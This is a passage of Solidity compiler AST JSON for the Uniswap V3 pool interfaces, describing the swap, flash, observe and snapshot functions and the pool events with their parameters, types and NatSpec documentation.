													"nodeType": "ElementaryTypeName",
													"src": "3714:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3654:80:3"
									},
									"returnParameters": {
										"id": 1741,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1738,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "3753:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1737,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3753:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1740,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1742,
												"src": "3770:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1739,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3770:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3752:34:3"
									},
									"scope": 1779,
									"src": "3641:146:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1743,
										"nodeType": "StructuredDocumentation",
										"src": "3793:1015:3",
										"text": "@notice Swap token0 for token1, or token1 for token0\n @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n @param recipient The address to receive the output of the swap\n @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n value after the swap. If one for zero, the price cannot be greater than this value after the swap\n @param data Any data to be passed through to the callback\n @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
									},
									"functionSelector": "128acb08",
									"id": 1760,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "swap",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1754,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1745,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1760,
												"src": "4836:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1744,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4836:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1747,
												"mutability": "mutable",
												"name": "zeroForOne",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1760,
												"src": "4863:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 1746,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4863:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1749,
												"mutability": "mutable",
												"name": "amountSpecified",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1760,
												"src": "4888:22:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1748,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "4888:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1751,
												"mutability": "mutable",
												"name": "sqrtPriceLimitX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1760,
												"src": "4920:25:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1750,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "4920:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1753,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1760,
												"src": "4955:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1752,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "4955:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4826:154:3"
									},
									"returnParameters": {
										"id": 1759,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1756,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1760,
												"src": "4999:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1755,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "4999:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1758,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1760,
												"src": "5015:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1757,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "5015:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4998:32:3"
									},
									"scope": 1779,
									"src": "4813:218:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1761,
										"nodeType": "StructuredDocumentation",
										"src": "5037:657:3",
										"text": "@notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback\n @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling\n with 0 amount{0,1} and sending the donation amount(s) from the callback\n @param recipient The address which will receive the token0 and token1 amounts\n @param amount0 The amount of token0 to send\n @param amount1 The amount of token1 to send\n @param data Any data to be passed through to the callback"
									},
									"functionSelector": "490e6cbc",
									"id": 1772,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "flash",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1770,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1763,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1772,
												"src": "5723:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1762,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5723:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1765,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1772,
												"src": "5750:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1764,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5750:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1767,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1772,
												"src": "5775:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1766,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5775:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1769,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1772,
												"src": "5800:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1768,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "5800:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5713:112:3"
									},
									"returnParameters": {
										"id": 1771,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5834:0:3"
									},
									"scope": 1779,
									"src": "5699:136:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1773,
										"nodeType": "StructuredDocumentation",
										"src": "5841:367:3",
										"text": "@notice Increase the maximum number of price and liquidity observations that this pool will store\n @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n the input observationCardinalityNext.\n @param observationCardinalityNext The desired minimum number of observations for the pool to store"
									},
									"functionSelector": "32148f67",
									"id": 1778,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "increaseObservationCardinalityNext",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1776,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1775,
												"mutability": "mutable",
												"name": "observationCardinalityNext",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1778,
												"src": "6257:33:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1774,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "6257:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6256:35:3"
									},
									"returnParameters": {
										"id": 1777,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "6300:0:3"
									},
									"scope": 1779,
									"src": "6213:88:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1780,
							"src": "173:6130:3"
						}
					],
					"src": "45:6259:3"
				},
				"id": 3
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
					"exportedSymbols": {
						"IUniswapV3PoolDerivedState": [
							1810
						]
					},
					"id": 1811,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1781,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1782,
								"nodeType": "StructuredDocumentation",
								"src": "71:222:4",
								"text": "@title Pool state that is not stored\n @notice Contains view functions to provide information about the pool that is computed rather than stored on the\n blockchain. The functions here may have variable gas costs."
							},
							"fullyImplemented": false,
							"id": 1810,
							"linearizedBaseContracts": [
								1810
							],
							"name": "IUniswapV3PoolDerivedState",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1783,
										"nodeType": "StructuredDocumentation",
										"src": "336:1045:4",
										"text": "@notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\n @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing\n the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,\n you must call it with secondsAgos = [3600, 0].\n @dev The time weighted average tick represents the geometric time weighted average price of the pool, in\n log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\n @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned\n @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp\n @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block\n timestamp"
									},
									"functionSelector": "883bdbfd",
									"id": 1795,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "observe",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1787,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1786,
												"mutability": "mutable",
												"name": "secondsAgos",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1795,
												"src": "1403:29:4",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint32_$dyn_calldata_ptr",
													"typeString": "uint32[]"
												},
												"typeName": {
													"baseType": {
														"id": 1784,
														"name": "uint32",
														"nodeType": "ElementaryTypeName",
														"src": "1403:6:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"id": 1785,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1403:8:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint32_$dyn_storage_ptr",
														"typeString": "uint32[]"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1402:31:4"
									},
									"returnParameters": {
										"id": 1794,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1790,
												"mutability": "mutable",
												"name": "tickCumulatives",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1795,
												"src": "1481:30:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_int56_$dyn_memory_ptr",
													"typeString": "int56[]"
												},
												"typeName": {
													"baseType": {
														"id": 1788,
														"name": "int56",
														"nodeType": "ElementaryTypeName",
														"src": "1481:5:4",
														"typeDescriptions": {
															"typeIdentifier": "t_int56",
															"typeString": "int56"
														}
													},
													"id": 1789,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1481:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_int56_$dyn_storage_ptr",
														"typeString": "int56[]"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1793,
												"mutability": "mutable",
												"name": "secondsPerLiquidityCumulativeX128s",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1795,
												"src": "1513:51:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint160_$dyn_memory_ptr",
													"typeString": "uint160[]"
												},
												"typeName": {
													"baseType": {
														"id": 1791,
														"name": "uint160",
														"nodeType": "ElementaryTypeName",
														"src": "1513:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														}
													},
													"id": 1792,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1513:9:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint160_$dyn_storage_ptr",
														"typeString": "uint160[]"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1480:85:4"
									},
									"scope": 1810,
									"src": "1386:180:4",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1796,
										"nodeType": "StructuredDocumentation",
										"src": "1572:771:4",
										"text": "@notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\n @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.\n I.e., snapshots cannot be compared if a position is not held for the entire period between when the first\n snapshot is taken and the second snapshot is taken.\n @param tickLower The lower tick of the range\n @param tickUpper The upper tick of the range\n @return tickCumulativeInside The snapshot of the tick accumulator for the range\n @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range\n @return secondsInside The snapshot of seconds per liquidity for the range"
									},
									"functionSelector": "a38807f2",
									"id": 1809,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "snapshotCumulativesInside",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1801,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1798,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1809,
												"src": "2383:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1797,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2383:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1800,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1809,
												"src": "2400:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1799,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2400:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2382:34:4"
									},
									"returnParameters": {
										"id": 1808,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1803,
												"mutability": "mutable",
												"name": "tickCumulativeInside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1809,
												"src": "2477:26:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 1802,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "2477:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1805,
												"mutability": "mutable",
												"name": "secondsPerLiquidityInsideX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1809,
												"src": "2517:37:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1804,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "2517:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1807,
												"mutability": "mutable",
												"name": "secondsInside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1809,
												"src": "2568:20:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 1806,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "2568:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2463:135:4"
									},
									"scope": 1810,
									"src": "2348:251:4",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1811,
							"src": "293:2308:4"
						}
					],
					"src": "45:2557:4"
				},
				"id": 4
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
					"exportedSymbols": {
						"IUniswapV3PoolEvents": [
							1929
						]
					},
					"id": 1930,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1812,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:5"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1813,
								"nodeType": "StructuredDocumentation",
								"src": "71:88:5",
								"text": "@title Events emitted by a pool\n @notice Contains all events emitted by the pool"
							},
							"fullyImplemented": true,
							"id": 1929,
							"linearizedBaseContracts": [
								1929
							],
							"name": "IUniswapV3PoolEvents",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 1814,
										"nodeType": "StructuredDocumentation",
										"src": "196:344:5",
										"text": "@notice Emitted exactly once by a pool when #initialize is first called on the pool\n @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize\n @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96\n @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool"
									},
									"id": 1820,
									"name": "Initialize",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1819,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1816,
												"indexed": false,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1820,
												"src": "562:20:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1815,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "562:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1818,
												"indexed": false,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1820,
												"src": "584:10:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1817,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "584:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "561:34:5"
									},
									"src": "545:51:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1821,
										"nodeType": "StructuredDocumentation",
										"src": "602:551:5",
										"text": "@notice Emitted when liquidity is minted for a given position\n @param sender The address that minted the liquidity\n @param owner The owner of the position and recipient of any minted liquidity\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount The amount of liquidity minted to the position range\n @param amount0 How much token0 was required for the minted liquidity\n @param amount1 How much token1 was required for the minted liquidity"
									},
									"id": 1837,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1836,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1823,
												"indexed": false,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1837,
												"src": "1178:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1822,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1178:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1825,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1837,
												"src": "1202:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1824,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1202:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1827,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1837,
												"src": "1233:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1826,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1233:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1829,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1837,
												"src": "1266:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1828,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1266:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1831,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1837,
												"src": "1299:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1830,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1299:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1833,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1837,
												"src": "1323:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1832,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1323:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1835,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1837,
												"src": "1348:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1834,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1348:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1168:201:5"
									},
									"src": "1158:212:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1838,
										"nodeType": "StructuredDocumentation",
										"src": "1376:493:5",
										"text": "@notice Emitted when fees are collected by the owner of a position\n @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\n @param owner The owner of the position for which fees are collected\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount0 The amount of token0 fees collected\n @param amount1 The amount of token1 fees collected"
									},
									"id": 1852,
									"name": "Collect",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1851,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1840,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1852,
												"src": "1897:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1839,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1897:7:5",
